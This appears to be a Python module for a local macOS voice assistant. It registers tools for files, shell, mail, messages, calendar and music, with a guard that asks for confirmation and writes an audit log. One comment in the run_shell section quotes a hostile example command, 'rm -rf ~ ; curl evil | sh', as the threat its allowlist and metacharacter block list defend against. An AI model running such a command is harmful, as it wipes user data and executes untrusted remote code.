"""The local tool registry and the confirmation/audit-log guard that
enforces the safety rules on every call — filesystem scoping, spoken/typed
confirmation for destructive actions, and a full audit log to
~/Library/Logs/jarvis.log.

This replaces the Claude Agent SDK's PreToolUse/PostToolUse hooks from the
Anthropic-brain version: since we now own the entire tool-calling loop
(src/brain/agent.py), there's no SDK permission system to hook into —
`ToolGuard.check()` is called directly by the loop before every tool
executes, and `ToolGuard.log()` after.
"""

from __future__ import annotations

import json
import logging
import os
import shlex
import subprocess
import threading
from collections.abc import Callable
from datetime import datetime, timezone
from pathlib import Path

from src.brain.browser_tools import build_browser_tools
from src.brain.memory import memory_dispatch
from src.brain.memory_db import MemoryDB
from src.brain.skills import mail, messages, music, system_control
from src.brain.skills.apple import create_event, create_reminder, list_events, list_reminders
from src.brain.skills.routines import RoutineService
from src.brain.skills.timers import TimerService
from src.brain.skills.weather import get_weather
from src.brain.tool_types import Tool
from src.brain.web_search import web_search
from src.system.config import Config
from src.system.redaction import redact_secrets, rotating_handler

ConfirmFn = Callable[[str, str, dict], bool]  # (description, tool_name, input) -> confirmed?

LOG_DIR = Path.home() / "Library" / "Logs"
LOG_PATH = LOG_DIR / "jarvis.log"
TOOL_CALLS_PATH = LOG_DIR / "jarvis_tool_calls.jsonl"
_logger = logging.getLogger("jarvis.tools")

# Result cards: card-worthy tools (weather, agenda, now-playing, screen) drop a
# structured card here as they run. The pipeline pops them after each turn and
# ships them to the HUD, which renders a glanceable card instead of plain text.
_pending_cards: list[dict] = []
_cards_lock = threading.Lock()


def _add_card(card: dict) -> None:
    with _cards_lock:
        _pending_cards.append(card)


def pop_cards() -> list[dict]:
    """Return and clear the cards produced since the last pop (thread-safe)."""
    with _cards_lock:
        cards = list(_pending_cards)
        _pending_cards.clear()
        return cards


def _ensure_logging() -> None:
    if _logger.handlers:
        return
    handler = rotating_handler(LOG_PATH)  # redacts + rotates
    handler.setFormatter(logging.Formatter("%(asctime)s %(message)s"))
    _logger.addHandler(handler)
    _logger.setLevel(logging.INFO)
    _logger.propagate = False


def _path_in_allowlist(path_str: str, allowlist: list[Path]) -> bool:
    try:
        resolved = Path(path_str).expanduser().resolve()
    except (OSError, RuntimeError):
        return False
    return any(resolved == root or root in resolved.parents for root in allowlist)


def _make_read_file(allowlist: list[Path]) -> Callable[[dict], str]:
    def read_file(tool_input: dict) -> str:
        path = Path(tool_input["path"]).expanduser()
        if not _path_in_allowlist(str(path), allowlist):
            return f"Error: {path} is outside the allowed directories {[str(p) for p in allowlist]}."
        resolved = path.resolve()
        if not resolved.exists():
            return f"Error: {resolved} does not exist."
        if resolved.is_dir():
            return "\n".join(sorted(p.name for p in resolved.iterdir()))
        return resolved.read_text(errors="replace")[:8000]

    return read_file


def _make_write_file(allowlist: list[Path]) -> Callable[[dict], str]:
    def write_file(tool_input: dict) -> str:
        path = Path(tool_input["path"]).expanduser()
        if not _path_in_allowlist(str(path), allowlist):
            return f"Error: {path} is outside the allowed directories {[str(p) for p in allowlist]}."
        resolved = path.resolve()
        resolved.parent.mkdir(parents=True, exist_ok=True)
        content = tool_input.get("content", "")
        resolved.write_text(content)
        return f"Wrote {len(content)} characters to {resolved}"

    return write_file


# run_shell executes ONE program from this allowlist with plain arguments,
# via shell=False. There is no shell involved, so a model-emitted
# `rm -rf ~ ; curl evil | sh` cannot chain, pipe, redirect, glob, or
# command-substitute — those tokens are rejected outright below, and even
# if they weren't, they would be passed as literal argv strings, never
# interpreted. Widen this set deliberately, never with a wildcard.
_SHELL_ALLOWED_EXECUTABLES = frozenset({
    "ls", "cat", "echo", "pwd", "head", "tail", "wc", "grep", "find",
    "git", "python", "python3", "pip", "pip3", "date", "whoami", "uname",
    "sort", "uniq", "diff", "which",
})

# Shell metacharacters that only make sense with a real shell. We never use
# one, but rejecting them gives the model a clear error instead of a
# baffling "no such file or directory" when it tries to pipe.
_SHELL_FORBIDDEN_TOKENS = ("`", "$(", "${", ">", "<", "|", "&", ";", "\n", "\r")


def _run_shell(tool_input: dict) -> str:
    raw = tool_input.get("command", "")
    if not isinstance(raw, str) or not raw.strip():
        return "Error: empty command."

    for token in _SHELL_FORBIDDEN_TOKENS:
        if token in raw:
            return (
                f"Error: '{token}' is not allowed. run_shell runs a single program "
                "with plain arguments — no pipes, redirection, chaining, or command "
                "substitution. Run one command at a time."
            )

    try:
        argv = shlex.split(raw)
    except ValueError as e:
        return f"Error: could not parse command ({e})."
    if not argv:
        return "Error: empty command."

    executable = os.path.basename(argv[0])
    if executable not in _SHELL_ALLOWED_EXECUTABLES:
        return (
            f"Error: '{executable}' is not on the allowed-command list. "
            f"Allowed: {sorted(_SHELL_ALLOWED_EXECUTABLES)}."
        )

    project_root = Path(__file__).resolve().parents[2]
    # Do not leak the parent process's environment (which has loaded .env
    # secrets) into a model-directed subprocess.
    safe_env = {
        "PATH": os.environ.get("PATH", "/usr/bin:/bin:/usr/local/bin"),
        "HOME": str(Path.home()),
        "LANG": os.environ.get("LANG", "en_US.UTF-8"),
    }
    try:
        result = subprocess.run(
            argv,
            shell=False,
            cwd=str(project_root),
            capture_output=True,
            text=True,
            timeout=30,
            env=safe_env,
        )
    except subprocess.TimeoutExpired:
        return "Error: command timed out after 30 seconds"
    except FileNotFoundError:
        return f"Error: '{executable}' is not installed."
    output = (result.stdout + result.stderr).strip()
    return output[:4000] if output else "(no output)"


def _web_search(tool_input: dict) -> str:
    return web_search(tool_input["query"])


def _memory(tool_input: dict) -> str:
    return memory_dispatch(tool_input)


_memory_db: MemoryDB | None = None


def _get_memory_db() -> MemoryDB:
    global _memory_db
    if _memory_db is None:
        _memory_db = MemoryDB()
    return _memory_db


def _remember(tool_input: dict) -> str:
    content = str(tool_input.get("content", "")).strip()
    if not content:
        return "Error: nothing to remember."
    fact_id = _get_memory_db().remember(content, source="user")
    return f"Remembered (fact #{fact_id})."


def _recall(tool_input: dict) -> str:
    facts = _get_memory_db().search(str(tool_input.get("query", "")), limit=8)
    if not facts:
        return "No matching memories."
    return "\n".join(f"- {f.content}" for f in facts)


# One timer service for the whole process so timers survive across turns. The
# pipeline calls set_timer_notifier() at startup to make expiries speak aloud.
_timer_service = TimerService()


def set_timer_notifier(notify) -> None:
    _timer_service.notify = notify


# One routine service for the whole process. The pipeline wires its trigger.
_routine_service = RoutineService()


def get_routine_service() -> RoutineService:
    return _routine_service


def _add_routine(tool_input: dict) -> str:
    return _routine_service.add(str(tool_input.get("time", "")), str(tool_input.get("prompt", "")))


def _list_routines(_tool_input: dict) -> str:
    return _routine_service.listing()


def _remove_routine(tool_input: dict) -> str:
    try:
        rid = int(tool_input.get("id"))
    except (TypeError, ValueError):
        return "Error: give the routine id to remove."
    return _routine_service.remove(rid)


def _set_timer(tool_input: dict) -> str:
    try:
        seconds = float(tool_input.get("seconds"))
    except (TypeError, ValueError):
        return "Error: give the duration as a number of seconds."
    if seconds <= 0:
        return "Error: the duration must be a positive number of seconds."
    label = str(tool_input.get("label", "")).strip()
    tid = _timer_service.add(seconds, label)
    mins = seconds / 60
    pretty = f"{int(seconds)}s" if seconds < 90 else f"{mins:.0f} min"
    return f"Timer #{tid} set for {pretty}{' (' + label + ')' if label else ''}."


def _check_timers(_tool_input: dict) -> str:
    active = _timer_service.active()
    if not active:
        return "No active timers."
    return "; ".join(f"#{t['id']} {t['label'] or 'timer'}: {t['remaining']}s left" for t in active)


def _cancel_timer(tool_input: dict) -> str:
    try:
        tid = int(tool_input.get("id"))
    except (TypeError, ValueError):
        return "Error: give the timer id to cancel."
    return f"Cancelled timer #{tid}." if _timer_service.cancel(tid) else f"No timer #{tid}."


def _get_weather(tool_input: dict) -> str:
    location = str(tool_input.get("location", ""))
    result = get_weather(location)
    _add_card({"type": "weather", "title": location.strip() or "Weather", "text": result})
    return result


def _create_reminder(tool_input: dict) -> str:
    return create_reminder(str(tool_input.get("text", "")))


def _list_reminders(_tool_input: dict) -> str:
    return list_reminders()


def _list_events(tool_input: dict) -> str:
    try:
        days = int(tool_input.get("days", 1))
    except (TypeError, ValueError):
        days = 1
    result = list_events(days)
    _add_card({"type": "agenda", "title": "Agenda" if days <= 1 else f"Next {days} days", "text": result})
    return result


def _create_event(tool_input: dict) -> str:
    try:
        duration = int(tool_input.get("duration_minutes", 60))
    except (TypeError, ValueError):
        duration = 60
    return create_event(str(tool_input.get("title", "")), str(tool_input.get("start", "")), duration)


def _set_volume(tool_input: dict) -> str:
    try:
        return system_control.set_volume(int(tool_input["level"]))
    except (KeyError, TypeError, ValueError):
        return "Error: give the volume level 0-100."


def _change_volume(tool_input: dict) -> str:
    try:
        return system_control.change_volume(int(tool_input.get("delta", 10)))
    except (TypeError, ValueError):
        return "Error: give a numeric change amount."


def _system(fn):
    return lambda _tool_input: fn()


def _open_app(tool_input: dict) -> str:
    return system_control.open_app(str(tool_input.get("name", "")))


def _music_play_query(tool_input: dict) -> str:
    return music.play_playlist(str(tool_input.get("playlist", "")))


def _look_at_screen(tool_input: dict) -> str:
    from src.brain.skills.vision import look_at_screen

    question = str(tool_input.get("question", ""))
    result = look_at_screen(question)
    _add_card({"type": "screen", "title": question.strip() or "On your screen", "text": result})
    return result


def _music_current(_tool_input: dict) -> str:
    result = music.current_track()
    _add_card({"type": "music", "title": "Now playing", "text": result})
    return result


# --- mail ---
def _mail_unread(tool_input: dict) -> str:
    try:
        count = int(tool_input.get("count", 5))
    except (TypeError, ValueError):
        count = 5
    result = mail.list_unread(count)
    _add_card({"type": "email", "title": "Unread mail", "text": result})
    return result


def _mail_search(tool_input: dict) -> str:
    query = str(tool_input.get("query", ""))
    result = mail.search_mail(query)
    _add_card({"type": "email", "title": f"Mail: {query.strip()}" if query.strip() else "Mail", "text": result})
    return result


def _send_email(tool_input: dict) -> str:
    return mail.send_email(
        str(tool_input.get("to", "")),
        str(tool_input.get("subject", "")),
        str(tool_input.get("body", "")),
    )


# --- messages ---
def _recent_messages(tool_input: dict) -> str:
    try:
        count = int(tool_input.get("count", 10))
    except (TypeError, ValueError):
        count = 10
    result = messages.recent_messages(count)
    _add_card({"type": "messages", "title": "Recent messages", "text": result})
    return result


def _send_message(tool_input: dict) -> str:
    return messages.send_message(str(tool_input.get("to", "")), str(tool_input.get("text", "")))


def build_tools(cfg: Config) -> dict[str, Tool]:
    allowlist = cfg.resolved_filesystem_allowlist()

    tools: dict[str, Tool] = {
        "memory": Tool(
            name="memory",
            description=(
                "Store/retrieve facts across conversations under /memories. commands: "
                "view (path, optional view_range), create (path, file_text), "
                "str_replace (path, old_str, optional new_str), "
                "insert (path, insert_line, insert_text), delete (path), "
                "rename (old_path, new_path)."
            ),
            parameters={
                "command": "one of view|create|str_replace|insert|delete|rename",
                "path": "string, e.g. /memories/preferences.md",
                "file_text": "string, for create",
                "old_str": "string, for str_replace", "new_str": "string, optional for str_replace",
                "insert_line": "integer, for insert", "insert_text": "string, for insert",
                "old_path": "string, for rename", "new_path": "string, for rename",
            },
            handler=_memory,
        ),
        "read_file": Tool(
            name="read_file",
            description="Read a text file, or list a directory, inside the allowed directories.",
            parameters={"path": "string, absolute or ~-relative path"},
            handler=_make_read_file(allowlist),
        ),
        "write_file": Tool(
            name="write_file",
            description="Create or overwrite a text file inside the allowed directories.",
            parameters={"path": "string", "content": "string"},
            handler=_make_write_file(allowlist),
            confirm_key="Write",
        ),
        "run_shell": Tool(
            name="run_shell",
            description=(
                "Run ONE allowed program with plain arguments in the project "
                "directory (no pipes/redirection/chaining). 30s timeout. Allowed "
                "programs: ls, cat, echo, pwd, head, tail, wc, grep, find, git, "
                "python, pip, date, whoami, uname, sort, uniq, diff, which."
            ),
            parameters={"command": "string, e.g. 'git status' or 'grep -r TODO src'"},
            handler=_run_shell,
            confirm_key="run_shell_command",
        ),
        "web_search": Tool(
            name="web_search",
            description="Search the web and return the top results (title, url, snippet).",
            parameters={"query": "string"},
            handler=_web_search,
        ),
        "remember": Tool(
            name="remember",
            description=(
                "Save a durable fact about the user to structured long-term memory "
                "(survives restarts). Use for stable preferences and facts the user "
                "asks you to remember."
            ),
            parameters={"content": "string, the fact to store"},
            handler=_remember,
        ),
        "recall": Tool(
            name="recall",
            description="Search long-term memory for facts about the user.",
            parameters={"query": "string, what to look up"},
            handler=_recall,
        ),
        "set_timer": Tool(
            name="set_timer",
            description=(
                "Start a countdown timer. Convert the user's duration to seconds "
                "yourself (e.g. 10 minutes = 600). Jarvis announces it aloud when it ends."
            ),
            parameters={"seconds": "number of seconds", "label": "optional short name, e.g. 'tea'"},
            handler=_set_timer,
        ),
        "check_timers": Tool(
            name="check_timers",
            description="List active timers and how long is left on each.",
            parameters={},
            handler=_check_timers,
        ),
        "cancel_timer": Tool(
            name="cancel_timer",
            description="Cancel a timer by its id.",
            parameters={"id": "the timer id (integer)"},
            handler=_cancel_timer,
        ),
        "get_weather": Tool(
            name="get_weather",
            description="Get current weather and today's high/low for a place, by name.",
            parameters={"location": "city or place name, e.g. 'London'"},
            handler=_get_weather,
        ),
        "create_reminder": Tool(
            name="create_reminder",
            description="Add an item to the macOS Reminders app.",
            parameters={"text": "what to be reminded of, e.g. 'call the bank'"},
            handler=_create_reminder,
        ),
        "list_reminders": Tool(
            name="list_reminders",
            description="List the user's open (incomplete) reminders.",
            parameters={},
            handler=_list_reminders,
        ),
        "list_events": Tool(
            name="list_events",
            description="List calendar events for the next N days (default 1 = today).",
            parameters={"days": "integer, how many days ahead (1 = today)"},
            handler=_list_events,
        ),
        "create_event": Tool(
            name="create_event",
            description=(
                "Add an event to the calendar. Provide the start as "
                "'YYYY-MM-DD HH:MM' (24-hour); compute the date from today yourself."
            ),
            parameters={
                "title": "string, the event name",
                "start": "string, 'YYYY-MM-DD HH:MM'",
                "duration_minutes": "integer, default 60",
            },
            handler=_create_event,
        ),
        # --- system control ---
        "set_volume": Tool(
            name="set_volume", description="Set the system output volume (0-100).",
            parameters={"level": "integer 0-100"}, handler=_set_volume,
        ),
        "change_volume": Tool(
            name="change_volume", description="Turn the volume up or down by a relative amount.",
            parameters={"delta": "integer, e.g. 10 or -10"}, handler=_change_volume,
        ),
        "get_volume": Tool(
            name="get_volume", description="Report the current output volume.",
            parameters={}, handler=_system(system_control.get_volume),
        ),
        "toggle_dark_mode": Tool(
            name="toggle_dark_mode", description="Switch macOS between light and dark appearance.",
            parameters={}, handler=_system(system_control.toggle_dark_mode),
        ),
        "open_app": Tool(
            name="open_app", description="Open a macOS app by name, e.g. Safari, Notes, Slack.",
            parameters={"name": "string, the app name"}, handler=_open_app,
        ),
        "lock_screen": Tool(
            name="lock_screen", description="Lock the screen / put the display to sleep.",
            parameters={}, handler=_system(system_control.lock_screen),
        ),
        # --- music (Apple Music) ---
        "music_play": Tool(
            name="music_play", description="Resume/start Apple Music playback.",
            parameters={}, handler=_system(music.play),
        ),
        "music_pause": Tool(
            name="music_pause", description="Pause Apple Music.",
            parameters={}, handler=_system(music.pause),
        ),
        "music_next": Tool(
            name="music_next", description="Skip to the next track.",
            parameters={}, handler=_system(music.next_track),
        ),
        "music_previous": Tool(
            name="music_previous", description="Go to the previous track.",
            parameters={}, handler=_system(music.previous_track),
        ),
        "music_current": Tool(
            name="music_current", description="Say what track is currently playing.",
            parameters={}, handler=_music_current,
        ),
        "music_play_playlist": Tool(
            name="music_play_playlist", description="Play a named Apple Music playlist.",
            parameters={"playlist": "string, the playlist name"}, handler=_music_play_query,
        ),
        # --- routines ---
        "add_routine": Tool(
            name="add_routine",
            description=(
                "Schedule a daily routine: a request Jarvis runs and speaks at a set "
                "time every day, e.g. a morning briefing. Time is 24-hour HH:MM."
            ),
            parameters={
                "time": "string 'HH:MM' (24-hour)",
                "prompt": "what to do, e.g. 'tell me the weather and today's calendar'",
            },
            handler=_add_routine,
        ),
        "list_routines": Tool(
            name="list_routines", description="List the user's scheduled daily routines.",
            parameters={}, handler=_list_routines,
        ),
        "remove_routine": Tool(
            name="remove_routine", description="Delete a routine by its id.",
            parameters={"id": "the routine id (integer)"}, handler=_remove_routine,
        ),
        # --- vision ---
        "look_at_screen": Tool(
            name="look_at_screen",
            description=(
                "Take a screenshot and answer a question about what's on screen "
                "using a local vision model. Use when the user asks what's on their "
                "screen, to read/explain something visible, or 'look at this'."
            ),
            parameters={"question": "what to find out about the screen, e.g. 'what does this error say?'"},
            handler=_look_at_screen,
        ),
        # --- mail (Apple Mail) ---
        "check_email": Tool(
            name="check_email",
            description="Summarize the user's unread email (sender + subject) from Apple Mail.",
            parameters={"count": "integer, how many to show (default 5)"},
            handler=_mail_unread,
        ),
        "search_email": Tool(
            name="search_email",
            description="Search the Mail inbox by subject and list matching messages.",
            parameters={"query": "string to look for in subjects"},
            handler=_mail_search,
        ),
        "send_email": Tool(
            name="send_email",
            description=(
                "Compose and send an email via Apple Mail. Requires spoken/typed "
                "confirmation before it sends."
            ),
            parameters={
                "to": "recipient email address",
                "subject": "string, the subject line",
                "body": "string, the message body",
            },
            handler=_send_email,
            confirm_key="send_message",
        ),
        # --- messages (iMessage/SMS) ---
        "read_messages": Tool(
            name="read_messages",
            description="Read the most recent text messages (iMessage/SMS) with sender and time.",
            parameters={"count": "integer, how many recent messages (default 10)"},
            handler=_recent_messages,
        ),
        "send_message": Tool(
            name="send_message",
            description=(
                "Send an iMessage/SMS to a phone number, email, or contact handle. "
                "Requires spoken/typed confirmation before it sends."
            ),
            parameters={
                "to": "phone number, email, or handle",
                "text": "string, the message to send",
            },
            handler=_send_message,
            confirm_key="send_message",
        ),
    }

    tools.update(build_browser_tools())
    return tools


def _redact_input(tool_input: dict) -> dict:
    """Redact secrets from each string value of a tool input, per-value so a
    regex can never consume a JSON delimiter and corrupt the record."""
    redacted: dict = {}
    for key, value in tool_input.items():
        redacted[key] = redact_secrets(value) if isinstance(value, str) else value
    return redacted


class ToolGuard:
    """Confirmation gate + audit log, applied by src/brain/agent.py's tool
    loop before/after every tool call."""

    def __init__(self, cfg: Config, confirm_fn: ConfirmFn):
        self.cfg = cfg
        self.confirm_fn = confirm_fn
        _ensure_logging()

    def check(self, tool: Tool, tool_input: dict) -> tuple[bool, str]:
        """Returns (allowed, reason_if_denied)."""
        if tool.confirm_key and tool.confirm_key in self.cfg.require_confirmation_for:
            description = self._describe(tool, tool_input)
            if not self.confirm_fn(description, tool.name, tool_input):
                _logger.info("DENY tool=%s input=%s reason=not-confirmed", tool.name, tool_input)
                return False, "User did not say 'confirm'."

        if tool.name == "memory" and tool_input.get("command") == "delete":
            if "delete_file" in self.cfg.require_confirmation_for:
                description = f"delete memory file {tool_input.get('path')}"
                if not self.confirm_fn(description, tool.name, tool_input):
                    _logger.info("DENY tool=memory input=%s reason=not-confirmed", tool_input)
                    return False, "User did not say 'confirm'."

        return True, ""

    @staticmethod
    def _describe(tool: Tool, tool_input: dict) -> str:
        if tool.name == "write_file":
            return f"write to {tool_input.get('path', 'a file')}"
        if tool.name == "run_shell":
            return f"run this command: {tool_input.get('command', '')}"
        if tool.name.startswith("browser_"):
            action = tool.name[len("browser_"):]
            detail = tool_input.get("url") or tool_input.get("text") or tool_input.get("element") or ""
            return f"perform a browser {action} action" + (f" ({detail})" if detail else "")
        return f"use {tool.name}"

    def log(self, tool_name: str, tool_input: dict, result: str) -> None:
        _logger.info("TOOL_CALL tool=%s input=%s result=%s", tool_name, tool_input, str(result)[:500])

        TOOL_CALLS_PATH.parent.mkdir(parents=True, exist_ok=True)
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "tool": tool_name,
            "input": _redact_input(tool_input),
            "result": redact_secrets(str(result))[:500],
        }
        with open(TOOL_CALLS_PATH, "a") as f:
            f.write(json.dumps(entry, default=str) + "\n")
